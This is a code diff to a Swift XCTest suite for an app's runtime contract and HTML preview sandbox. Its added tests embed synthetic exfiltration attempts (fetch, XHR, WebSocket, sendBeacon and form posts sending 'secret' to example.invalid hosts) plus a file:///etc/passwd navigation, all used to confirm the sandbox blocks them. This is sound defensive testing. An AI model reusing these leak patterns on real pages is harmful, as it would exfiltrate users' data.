@@ -1,6 +1,8 @@
 import Foundation
 import XCTest
 import LodyCore
+import LodyRuntime
+import WebKit
 
 @MainActor
 final class RuntimeContractTests: XCTestCase {
@@ -52,12 +54,6 @@ final class RuntimeContractTests: XCTestCase {
     let role = Contract.AgentRoleItem(id: "role-1", ownerUserId: "user-1", visibility: .workspace, name: "Reviewer",
       description: "", promptPrefix: "Review carefully", revision: 1, updatedAt: 1_700_000_000_000,
       targets: [.init(machineId: "machine-1", agentConfigId: "agent-1", machineName: "Studio", agentName: "Claude", state: .configured)])
-    let share = Contract.PublishedSharesResultPagePageItem(shareId: "share-1", rootSessionId: "session-1",
-      publisherUserId: "user-1", status: .active, title: "Launch notes", revision: 2, credentialVersion: 1,
-      createdAt: 1_700_000_000_000, updatedAt: 1_700_000_000_000, totalBytes: 2048, conversationCount: 1,
-      canManage: true, canRevoke: true, hasLocalLink: false)
-    let target = Contract.HistoryTarget(machineId: "machine-1", machineName: "Studio", localProjectId: "p1",
-      projectName: "App", rootPath: "/Users/dev/app", provider: .init(cliType: .builtin, agentType: "claude"))
     let sonnet = Contract.CapabilityChoice(id: "sonnet", name: "Sonnet")
     let standard = Contract.CapabilityChoice(id: "default", name: "Default")
     let options = Contract.CreationOptions(availability: .online, sessionId: "session-new",
@@ -80,7 +76,7 @@ final class RuntimeContractTests: XCTestCase {
       .file(.init(editId: "original:1", fileName: "notes.md", mimeType: "text/markdown", sizeBytes: 12, fileId: "file-1",
         sha256: "abc123", textPreview: true, transport: "r2", uploadedAt: 1_700_000_000_000)),
     ]
-    XCTAssertEqual(decoded.map(\.gen), Array(repeating: 3, count: 95))
+    XCTAssertEqual(decoded.map(\.gen), Array(repeating: 3, count: 88))
     XCTAssertEqual(decoded.map(\.message), [
       .result(id: "req-hello", .hello(.init(protocol: 1, methods: ["hello", "ensureSession"]))),
       .result(id: "req-ensure", .ensureSession(.init())),
@@ -92,10 +88,6 @@ final class RuntimeContractTests: XCTestCase {
         args: .init(target: .index(.init(ownerUserId: "user-1", visibility: .workspace)), write: false)
       )))),
       .request(id: "req-github", .githubMentions(.init(workspaceId: "workspace-1", repoFullName: "lody/app"))),
-      .request(id: "req-share", .shareRequest(.management(.init(
-        workspaceId: "workspace-1",
-        args: .list(.init(workspaceId: "workspace-1", cursor: nil))
-      )))),
       .request(id: "req-share-revoke", .shareRequest(.api(.init(
         workspaceId: "workspace-1",
         args: .revoke(.init(args: .init(shareId: "share-1", expectedRevision: 2)))
@@ -121,26 +113,16 @@ final class RuntimeContractTests: XCTestCase {
       .result(id: "req-ping", .ping(.init())),
       .result(id: "req-shortcuts", .promptShortcuts(.list(.init(entries: [entry])))),
       .result(id: "req-settings", .remoteSettings(.init(settings: [
-        .init(kind: .mcp, id: "mcp-2", name: "Search", readOnly: false, detail: "stdio", enabledByDefault: true, configured: true),
+        .init(kind: .machine, id: "machine-1", name: "Studio", readOnly: false),
       ]))),
-      .result(id: "req-memory", .memorySettings(.init(
-        machines: [.init(id: "machine-1", name: "Studio")], machineId: "machine-1",
-        entries: [.init(machineId: "machine-1", providerId: "nowledge-mem", memoryId: "memory-1", name: "Work")],
-        identities: [.init(id: "memory-1", name: "Work")], status: .ready, cached: false
-      ))),
       .result(id: "req-roles", .agentRoles(.init(roles: [role], agents: [
         .init(id: "agent-1", name: "Claude", machineId: "machine-1", machineName: "Studio", cliType: "builtin", agentType: "claude"),
       ]))),
-      .result(id: "req-shares", .publishedShares(.page(.init(
-        workspaceId: "workspace-1", userId: "user-1", page: [share], isDone: false, continueCursor: "cursor-2"
-      )))),
       .result(id: "req-mentions", .mentionCatalog(.init(items: [
         .init(path: "session-2", name: "Fix login", kind: .session, subtitle: "app", insertText: "@session:session-2"),
       ], truncated: false, incomplete: false))),
       .result(id: "req-shortcut-save", .promptShortcuts(.save(.init(entry: saved)))),
-      .result(id: "req-shares-denied", .publishedShares(.failed(.init(error: "shares_forbidden")))),
       .error(id: "req-settings", method: "remoteSettings", .init(code: "setting_read_only", retryable: false)),
-      .error(id: "req-memory", method: "memorySettings", .init(code: "memory_forbidden", retryable: false)),
       .error(id: "req-roles", method: "agentRoles", .init(code: "role_conflict", retryable: false)),
       .error(id: "req-shortcuts", method: "promptShortcuts", .init(code: "workspace_changed", retryable: false)),
       .error(id: "req-mentions", method: "mentionCatalog", .init(code: "metadata_not_ready", retryable: false)),
@@ -148,10 +130,6 @@ final class RuntimeContractTests: XCTestCase {
       .error(id: "req-options", method: "creationOptions", .init(code: "project_unavailable", retryable: false)),
       .result(id: "req-projects-browse", .localProjects(.directory(.init(path: "/Users/dev", parentPath: "/Users",
         entries: [.init(name: "app", absolutePath: "/Users/dev/app")], truncated: true, nextCursor: "cursor-2")))),
-      .result(id: "req-projects-history", .localProjects(.history(.init(
-        sessions: [.init(acpSessionId: "acp-1", title: "Fix login", importedSessionId: "session-9", status: .imported)],
-        failures: [.init(acpSessionId: "acp-2", message: "missing transcript")])))),
-      .result(id: "req-projects-targets", .localProjects(.targets(.init(targets: [target])))),
       .result(id: "req-projects-add", .localProjects(.project(.init(project: .init(id: "machine-1:local:p2",
         machineId: "machine-1", name: "Docs", rootPath: "/Users/dev/docs"))))),
       .error(id: "req-projects-browse", method: "localProjects", .init(code: "machine_unavailable", retryable: false)),
@@ -229,7 +207,7 @@ final class RuntimeContractTests: XCTestCase {
       "req-hello", "req-ensure", "req-start", "req-restore", "req-restore-none",
       "req-active", "req-open", "req-close", "req-release", "req-ping",
       "req-shortcuts", "req-settings", "req-memory", "req-roles", "req-shares", "req-mentions", "req-shortcut-save",
-      "req-options", "req-projects-browse", "req-projects-history", "req-sharing", "req-sharing-close",
+      "req-options", "req-projects-browse", "req-sharing", "req-sharing-close",
       "req-preview", "req-simulator",
       "req-item-detail", "req-turn-diff", "req-file-diff", "req-workspace-changes", "req-read-file", "req-list-dir",
       "req-create-session", "req-delete-session", "req-archive-session", "req-pin-session", "req-mark-read",
@@ -280,85 +258,76 @@ final class RuntimeContractTests: XCTestCase {
       channel.receive(replies[reply])
       _ = try await task.value
     }
-    try await roundTrip(Contract.Calls.Start.self, .init(workspaceId: "workspace-1", userId: "user-1", active: true), reply: 18)
-    try await roundTrip(Contract.Calls.RestoreSessions.self, .init(ids: ["session-1", "session-2"], current: "session-1", reserved: ["session-2"]), reply: 20)
-    try await roundTrip(Contract.Calls.RestoreSessions.self, .init(ids: [], current: nil, reserved: []), reply: 21)
-    try await roundTrip(Contract.Calls.SetActive.self, .init(active: false), reply: 22)
-    try await roundTrip(Contract.Calls.OpenSession.self, .init(sessionId: "session-1"), reply: 23)
-    try await roundTrip(Contract.Calls.CloseSession.self, .init(), reply: 24)
-    try await roundTrip(Contract.Calls.ReleaseReserve.self, .init(sessionId: "session-2"), reply: 25)
-    try await roundTrip(Contract.Calls.Ping.self, .init(), reply: 26)
+    try await roundTrip(Contract.Calls.Start.self, .init(workspaceId: "workspace-1", userId: "user-1", active: true), reply: 17)
+    try await roundTrip(Contract.Calls.RestoreSessions.self, .init(ids: ["session-1", "session-2"], current: "session-1", reserved: ["session-2"]), reply: 19)
+    try await roundTrip(Contract.Calls.RestoreSessions.self, .init(ids: [], current: nil, reserved: []), reply: 20)
+    try await roundTrip(Contract.Calls.SetActive.self, .init(active: false), reply: 21)
+    try await roundTrip(Contract.Calls.OpenSession.self, .init(sessionId: "session-1"), reply: 22)
+    try await roundTrip(Contract.Calls.CloseSession.self, .init(), reply: 23)
+    try await roundTrip(Contract.Calls.ReleaseReserve.self, .init(sessionId: "session-2"), reply: 24)
+    try await roundTrip(Contract.Calls.Ping.self, .init(), reply: 25)
     let github = Contract.PromptShortcutProject.github(.init(repository: "lody/app"))
     let readme = Contract.PromptShortcutTarget.file(.init(project: github, path: "README.md"))
     let shortcut = Contract.PromptShortcut(v: 1, id: "shortcut-2", workspaceId: "workspace-1", ownerUserId: "user-1",
       visibility: .workspace, name: "Review", slug: "review", scope: .init(project: github), revision: "rev-2",
       createdAt: 1_700_000_000_000, updatedAt: 1_700_000_000_000, prompt: "Review @README.md",
       mentions: [.init(start: 7, end: 17, label: "@README.md", target: readme)])
-    try await roundTrip(Contract.Calls.PromptShortcuts.self, .list(.init(workspaceId: "workspace-1", userId: "user-1")), reply: 27)
-    try await roundTrip(Contract.Calls.RemoteSettings.self, .init(workspaceId: "workspace-1", userId: "user-1", kind: .mcp,
-      remove: .init(kind: .mcp, id: "mcp-1", name: "Docs", readOnly: false, detail: "http", enabledByDefault: false,
-        configured: true, updatedAt: 1_700_000_000_000)), reply: 28)
-    try await roundTrip(Contract.Calls.MemorySettings.self, .`import`(.init(workspaceId: "workspace-1", userId: "user-1",
-      machineId: "machine-1", memoryId: "memory-1")), reply: 29)
+    try await roundTrip(Contract.Calls.PromptShortcuts.self, .list(.init(workspaceId: "workspace-1", userId: "user-1")), reply: 26)
+    try await roundTrip(Contract.Calls.RemoteSettings.self, .init(workspaceId: "workspace-1", userId: "user-1", kind: .machine), reply: 27)
     try await roundTrip(Contract.Calls.AgentRoles.self, .save(.init(workspaceId: "workspace-1", userId: "user-1", id: "role-1",
       base: nil, fields: .init(name: "Reviewer", description: "", promptPrefix: "Review carefully", visibility: .workspace),
-      target: .init(machineId: "machine-1", agentConfigId: "agent-1"))), reply: 30)
-    try await roundTrip(Contract.Calls.PublishedShares.self, .list(.init(workspaceId: "workspace-1", userId: "user-1", cursor: "cursor-1")), reply: 31)
+      target: .init(machineId: "machine-1", agentConfigId: "agent-1"))), reply: 28)
     try await roundTrip(Contract.Calls.MentionCatalog.self, .init(workspaceId: "workspace-1", userId: "user-1",
-      category: .session, sessionId: "session-1"), reply: 32)
+      category: .session, sessionId: "session-1"), reply: 29)
     try await roundTrip(Contract.Calls.PromptShortcuts.self, .save(.init(workspaceId: "workspace-1", userId: "user-1",
-      entry: nil, value: shortcut, bodyDocId: "body-2")), reply: 33)
-    try await roundTrip(Contract.Calls.CreationOptions.self, .init(workspaceId: "workspace-1", projectId: "machine-1:local:p1"), reply: 40)
+      entry: nil, value: shortcut, bodyDocId: "body-2")), reply: 30)
+    try await roundTrip(Contract.Calls.CreationOptions.self, .init(workspaceId: "workspace-1", projectId: "machine-1:local:p1"), reply: 35)
     try await roundTrip(Contract.Calls.LocalProjects.self, .browse(.init(workspaceId: "workspace-1", browserId: "browser-1",
-      userId: "user-1", machineId: "machine-1", path: "/Users/dev", cursor: "cursor-1")), reply: 42)
-    let target = Contract.HistoryTarget(machineId: "machine-1", machineName: "Studio", localProjectId: "p1",
-      projectName: "App", rootPath: "/Users/dev/app", provider: .init(cliType: .builtin, agentType: "claude"))
-    try await roundTrip(Contract.Calls.LocalProjects.self, .history(.init(workspaceId: "workspace-1", browserId: "history-1",
-      userId: "user-1", history: .`import`(.init(target: target, acpSessionIds: ["acp-1", "acp-2"])))), reply: 43)
+      userId: "user-1", machineId: "machine-1", path: "/Users/dev", cursor: "cursor-1")), reply: 37)
     try await roundTrip(Contract.Calls.SessionSharing.self, .init(workspaceId: "workspace-1", sessionId: "session-1",
-      editorId: "ios-share-1", action: .publish, selected: ["session-1"]), reply: 47)
+      editorId: "ios-share-1", action: .publish, selected: ["session-1"]), reply: 40)
     try await roundTrip(Contract.Calls.SessionSharing.self, .init(workspaceId: "workspace-1", sessionId: "session-1",
-      editorId: "ios-share-1", action: .close), reply: 48)
-    try await roundTrip(Contract.Calls.SessionPreview.self, .init(sessionId: "session-1", userId: "user-1", action: .create), reply: 50)
+      editorId: "ios-share-1", action: .close), reply: 41)
+    try await roundTrip(Contract.Calls.SessionPreview.self, .init(sessionId: "session-1", userId: "user-1", action: .create), reply: 43)
     try await roundTrip(Contract.Calls.IosSimulatorControl.self, .init(workspaceId: "workspace-1", sessionId: "session-1",
-      userId: "user-1", command: .start(.init(udid: "00000000-0000-4000-8000-000000000001"))), reply: 52)
-    try await roundTrip(Contract.Calls.ItemDetail.self, .init(sessionId: "session-1", entryId: "entry-1", itemId: "tool-1", cursor: "2"), reply: 55)
-    try await roundTrip(Contract.Calls.TurnDiff.self, .init(sessionId: "session-1", entryId: "entry-1", path: "src/app.ts"), reply: 57)
-    try await roundTrip(Contract.Calls.FileDiff.self, .init(sessionId: "session-1", path: "src/app.ts"), reply: 58)
-    try await roundTrip(Contract.Calls.WorkspaceChanges.self, .init(sessionId: "session-1"), reply: 59)
-    try await roundTrip(Contract.Calls.ReadFile.self, .init(sessionId: "session-1", path: "README.md"), reply: 60)
+      userId: "user-1", command: .start(.init(udid: "00000000-0000-4000-8000-000000000001"))), reply: 45)
+    try await roundTrip(Contract.Calls.ItemDetail.self, .init(sessionId: "session-1", entryId: "entry-1", itemId: "tool-1", cursor: "2"), reply: 48)
+    try await roundTrip(Contract.Calls.TurnDiff.self, .init(sessionId: "session-1", entryId: "entry-1", path: "src/app.ts"), reply: 50)
+    try await roundTrip(Contract.Calls.FileDiff.self, .init(sessionId: "session-1", path: "src/app.ts"), reply: 51)
+    try await roundTrip(Contract.Calls.WorkspaceChanges.self, .init(sessionId: "session-1"), reply: 52)
+    try await roundTrip(Contract.Calls.ReadFile.self, .init(sessionId: "session-1", path: "README.md"), reply: 53)
     try await roundTrip(Contract.Calls.ListDir.self, .init(workspaceId: "workspace-1", sessionId: "session-1",
-      relativePath: "src", userId: "user-1"), reply: 63)
+      relativePath: "src", userId: "user-1"), reply: 56)
     let free = Contract.BillingEntitlement(effectivePlanTier: .free, checkoutPending: false)
     try await roundTrip(Contract.Calls.CreateSession.self, .init(workspaceId: "workspace-1", projectId: "machine-1:local:p1",
       sessionId: "00000000-0000-4000-8000-000000000002", machineId: "machine-1", agentConfigId: "agent-1", userId: "user-1",
-      title: "Fix login", billingEntitlement: free), reply: 65)
+      title: "Fix login", billingEntitlement: free), reply: 58)
     try await roundTrip(Contract.Calls.DeleteSession.self, .init(workspaceId: "workspace-1", sessionId: "session-1",
-      sessionIds: ["session-1", "session-3"]), reply: 66)
-    try await roundTrip(Contract.Calls.ArchiveSession.self, .init(workspaceId: "workspace-1", sessionId: "session-1", archived: true), reply: 67)
-    try await roundTrip(Contract.Calls.PinSession.self, .init(workspaceId: "workspace-1", sessionId: "session-1", pinned: true), reply: 68)
+      sessionIds: ["session-1", "session-3"]), reply: 59)
+    try await roundTrip(Contract.Calls.ArchiveSession.self, .init(workspaceId: "workspace-1", sessionId: "session-1", archived: true), reply: 60)
+    try await roundTrip(Contract.Calls.PinSession.self, .init(workspaceId: "workspace-1", sessionId: "session-1", pinned: true), reply: 61)
     try await roundTrip(Contract.Calls.MarkSessionRead.self, .init(workspaceId: "workspace-1", sessionId: "session-1",
-      lastReadAt: 1_700_000_000_000), reply: 69)
-    try await roundTrip(Contract.Calls.RenameSession.self, .init(workspaceId: "workspace-1", sessionId: "session-1", title: "Renamed"), reply: 70)
-    try await roundTrip(Contract.Calls.CheckTurnQuota.self, .init(sessionId: "session-1", billingEntitlement: nil), reply: 71)
+      lastReadAt: 1_700_000_000_000), reply: 62)
+    try await roundTrip(Contract.Calls.RenameSession.self, .init(workspaceId: "workspace-1", sessionId: "session-1", title: "Renamed"), reply: 63)
+    try await roundTrip(Contract.Calls.CheckTurnQuota.self, .init(sessionId: "session-1", billingEntitlement: nil), reply: 64)
     try await roundTrip(Contract.Calls.SendTurn.self, .init(sessionId: "session-1", id: "00000000-0000-4000-8000-000000000003",
       backgroundTaskId: "task-1", queue: false, guide: false, machineId: "machine-1", userId: "user-1", text: "Hello",
       attachmentBlocks: [["type": .string("image"), "imageId": .string("image-1"), "mimeType": .string("image/png"), "sizeBytes": .number(2048)]],
       cliType: "builtin", agentType: "claude", modelId: .init(value: nil), reasoningEffort: .init(value: "high"),
       reasoningEffortConfigId: "reasoning_effort", configOptionValues: ["fast": .bool(true)],
-      billingEntitlement: .init(effectivePlanTier: .plus, checkoutPending: false)), reply: 72)
+      billingEntitlement: .init(effectivePlanTier: .plus, checkoutPending: false)), reply: 65)
     try await roundTrip(Contract.Calls.EditSession.self, .read(.init(sessionId: "session-1", expectedUserTurnId: "turn-1",
-      userId: "user-1", billingEntitlement: nil)), reply: 73)
+      userId: "user-1", billingEntitlement: nil)), reply: 66)
     try await roundTrip(Contract.Calls.EditSession.self, .send(.init(sessionId: "session-1", expectedUserTurnId: "turn-1", id: "turn-2",
       userId: "user-1", billingEntitlement: free, backgroundTaskId: "task-2", text: "Edited", retainedIds: ["original:0"],
-      attachmentBlocks: [])), reply: 74)
+      attachmentBlocks: [])), reply: 67)
     try await roundTrip(Contract.Calls.ControlTurn.self, .init(action: .steer, sessionId: "session-1", machineId: "machine-1",
-      turnId: "turn-3", messageId: "turn-4", interrupt: false), reply: 75)
+      turnId: "turn-3", messageId: "turn-4", interrupt: false), reply: 68)
     try await roundTrip(Contract.Calls.RespondPermission.self, .init(sessionId: "session-1", entryId: "entry-1", itemId: "tool-1",
       requestId: "permission-1", optionId: "submit", answers: [
         "Scope": .string("Repository"), "Checks": .array([.string("Lint"), .string("Tests")]),
-      ]), reply: 76)
-    try await roundTrip(Contract.Calls.ProbeSchema.self, .init(workspaceId: "workspace-1"), reply: 93)
+      ]), reply: 69)
+    try await roundTrip(Contract.Calls.ProbeSchema.self, .init(workspaceId: "workspace-1"), reply: 86)
     XCTAssertEqual(harness.posts.count, expected.count)
     for index in 4..<expected.count {
       XCTAssertEqual(try json(harness.posts[index]), try json(expected[index]))
@@ -483,4 +452,111 @@ final class RuntimeContractTests: XCTestCase {
     }
     XCTAssertEqual(channel.pendingCount, 0)
   }
+}
+
+extension RuntimeContractTests {
+  func testPreviewNavigationHasNoExternalOrPopupEscape() {
+    let root = URL(string: "lody-preview://synthetic/__lody_files/index.html")!
+    func allowed(_ url: String, initial: Bool = false, main: Bool = true, method: String = "GET", type: WKNavigationType = .other) -> Bool {
+      HTMLPreviewDocumentPolicy.allowsNavigation(url: URL(string: url)!, documentURL: root, isMainFrame: main, isInitialLoad: initial, method: method, navigationType: type)
+    }
+    XCTAssertTrue(allowed(root.absoluteString, initial: true))
+    XCTAssertTrue(allowed(root.absoluteString + "#chart"))
+    XCTAssertFalse(allowed(root.absoluteString))
+    XCTAssertFalse(allowed("https://example.invalid/leak", initial: true))
+    XCTAssertFalse(allowed("https://example.invalid/leak", type: .linkActivated))
+    XCTAssertFalse(allowed(root.absoluteString, main: false))
+    XCTAssertFalse(allowed(root.absoluteString, initial: true, method: "POST", type: .formSubmitted))
+    XCTAssertFalse(allowed(root.absoluteString + "?leak=content#x"))
+    XCTAssertFalse(allowed("file:///etc/passwd", initial: true))
+    XCTAssertFalse(allowed("about:blank", initial: true))
+  }
+
+  func testPreviewCSPBlocksActiveConnectionsAndPreservesStaticRendering() async throws {
+    let handler = PreviewPolicySchemeHandler()
+    let configuration = WKWebViewConfiguration()
+    configuration.websiteDataStore = .nonPersistent()
+    configuration.setURLSchemeHandler(handler, forURLScheme: "lody-preview")
+    let view = WKWebView(frame: .zero, configuration: configuration)
+    let loaded = expectation(description: "protected preview loaded")
+    let delegate = PreviewPolicyNavigationDelegate { loaded.fulfill() }
+    view.navigationDelegate = delegate
+    view.load(URLRequest(url: URL(string: "lody-preview://synthetic/index.html")!))
+    await fulfillment(of: [loaded], timeout: 10)
+    let value: String = try await withCheckedThrowingContinuation { continuation in
+      view.callAsyncJavaScript("""
+      await Promise.all([
+        fetch('https://example.invalid/leak').then(() => { throw Error('fetch escaped') }, () => {}),
+        new Promise(resolve => { const xhr = new XMLHttpRequest(); xhr.open('POST', 'https://example.invalid/leak'); xhr.onerror = resolve; xhr.send('secret'); })
+      ]);
+      let socketBlocked = false;
+      try { new WebSocket('wss://example.invalid/leak'); } catch { socketBlocked = true; }
+      const beaconBlocked = new Promise(resolve => {
+        document.addEventListener('securitypolicyviolation', function blocked(e) {
+          if (e.violatedDirective === 'connect-src' && e.blockedURI.startsWith('https://beacon.invalid')) {
+            document.removeEventListener('securitypolicyviolation', blocked); resolve(true);
+          }
+        });
+      });
+      navigator.sendBeacon('https://beacon.invalid/leak', 'secret');
+      await beaconBlocked;
+      return JSON.stringify({script: window.staticScriptLoaded, border: getComputedStyle(document.body).borderTopWidth,
+        socketBlocked, beaconBlocked: true, connects: window.violations.filter(x => x === 'connect-src').length,
+        formBlocked: window.violations.includes('form-action')});
+      """, arguments: [:], in: nil, in: .page) { result in
+        switch result {
+        case .success(let value):
+          guard let text = value as? String else {
+            continuation.resume(throwing: CocoaError(.coderInvalidValue)); return
+          }
+          continuation.resume(returning: text)
+        case .failure(let error): continuation.resume(throwing: error)
+        }
+      }
+    }
+    let result = try XCTUnwrap(JSONSerialization.jsonObject(with: Data(value.utf8)) as? [String: Any])
+    XCTAssertEqual(result["script"] as? Bool, true)
+    XCTAssertEqual(result["border"] as? String, "2px")
+    XCTAssertEqual(result["socketBlocked"] as? Bool, true)
+    XCTAssertEqual(result["beaconBlocked"] as? Bool, true)
+    XCTAssertGreaterThanOrEqual(result["connects"] as? Int ?? 0, 2)
+    XCTAssertEqual(result["formBlocked"] as? Bool, true)
+    view.stopLoading()
+  }
+}
+
+@MainActor
+private final class PreviewPolicyNavigationDelegate: NSObject, WKNavigationDelegate {
+  let loaded: () -> Void
+  init(_ loaded: @escaping () -> Void) { self.loaded = loaded }
+  func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) { loaded() }
+}
+
+@MainActor
+private final class PreviewPolicySchemeHandler: NSObject, WKURLSchemeHandler {
+  func webView(_ webView: WKWebView, start task: WKURLSchemeTask) {
+    let url = task.request.url!
+    let data: Data
+    let mime: String
+    switch url.path {
+    case "/app.js":
+      data = Data("window.staticScriptLoaded = true".utf8); mime = "application/javascript"
+    case "/app.css":
+      data = Data("body { border-top: 2px solid red }".utf8); mime = "text/css"
+    default:
+      // An authored permissive policy must not weaken the prepended policy.
+      let html = """
+      <html><head><meta http-equiv="Content-Security-Policy" content="connect-src *; form-action *; script-src 'self' * 'unsafe-inline'; style-src 'self' * 'unsafe-inline'">
+      <script>window.violations = []; document.addEventListener('securitypolicyviolation', e => window.violations.push(e.violatedDirective));</script>
+      <link rel="stylesheet" href="app.css"><script src="app.js"></script></head>
+      <body><form action="https://example.invalid/leak" method="post"><input name="secret" value="synthetic"></form>
+      <script>document.querySelector('form').submit()</script></body></html>
+      """
+      data = HTMLPreviewDocumentPolicy.protect(Data(html.utf8))!; mime = "text/html"
+    }
+    task.didReceive(URLResponse(url: url, mimeType: mime, expectedContentLength: data.count, textEncodingName: "utf-8"))
+    task.didReceive(data)
+    task.didFinish()
+  }
+  func webView(_ webView: WKWebView, stop task: WKURLSchemeTask) {}
 }
